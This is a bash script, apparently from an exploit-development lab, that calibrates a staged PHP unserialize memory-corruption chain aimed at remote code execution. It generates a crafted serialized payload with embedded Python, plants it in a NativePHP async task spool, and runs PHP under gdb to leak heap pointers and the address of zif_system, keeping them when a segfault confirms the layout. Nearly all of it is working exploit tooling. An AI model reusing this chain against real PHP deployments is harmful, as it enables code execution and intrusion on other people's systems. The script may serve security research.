#!/bin/bash
# Calibrate D/CHUNK/ZIF for the staged chain with a SHAPE-IDENTICAL calib
# payload (same lengths as the real stage payloads: same task-id length,
# same addr-string length) so the allocation stream matches exactly.
# Usage: sweep_calib.sh [base] [addr_len]
LAB=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/lab
PHP=/tmp/php8512_build/plain2/sapi/cli/php
SPOOL="$LAB/storage/framework/async/payload"
BASE=${1:-1017}
ADDRLEN=${2:-48}
CALIB_ID=nphp-calib-0000000000000000000001

mkdir -p "$SPOOL"

python3 - "$BASE" "$ADDRLEN" <<'PYEOF' > /tmp/calib_payload.txt
import sys
base, addrlen = int(sys.argv[1]), int(sys.argv[2])
els = [f"i:{k};i:1;" for k in range(base)]
cls = "NativeAsyncCalib"
addr = "0" * addrlen
els.append(f'i:9998;O:{len(cls)}:"{cls}":1:{{s:4:"addr";s:{len(addr)}:"{addr}";}}')
els.append("i:9998;i:5;")
sys.stdout.write(f"a:{base + 2}:{{" + "".join(els) + "}")
PYEOF
cp /tmp/calib_payload.txt "$SPOOL/$CALIB_ID.task"
echo "calib payload bytes: $(wc -c < /tmp/calib_payload.txt) (base=$BASE addrlen=$ADDRLEN)"

OUT=$(timeout 60 env NATIVEPHP_TASK_ID=$CALIB_ID gdb -q -batch \
  -ex "set pagination off" -ex "set confirm off" -ex "set auto-load safe-path /" \
  -ex "run -n $LAB/runner_rce.php" \
  -ex 'set $d = *(struct php_unserialize_data **)var_hash' \
  -ex 'set $chunk = (char *)$d->entries.next' \
  -ex 'printf "DISC D=%p CHUNK=%p ZIF=%p\n", $d, $chunk, zif_system' \
  "$PHP" 2>&1)
DISC=$(echo "$OUT" | grep -o 'DISC D=0x[0-9a-f]* CHUNK=0x[0-9a-f]* ZIF=0x[0-9a-f]*' | head -1)
FAULT=$(echo "$OUT" | grep -c "SIGSEGV")
echo "fault=$FAULT $DISC"
if [ -n "$DISC" ] && [ "$FAULT" -gt 0 ]; then
  echo "$DISC" > "$LAB/calibration.txt"
  echo "[PASS] calibration saved to lab/calibration.txt"
else
  echo "[FAIL] no crash/discovery"; exit 1
fi
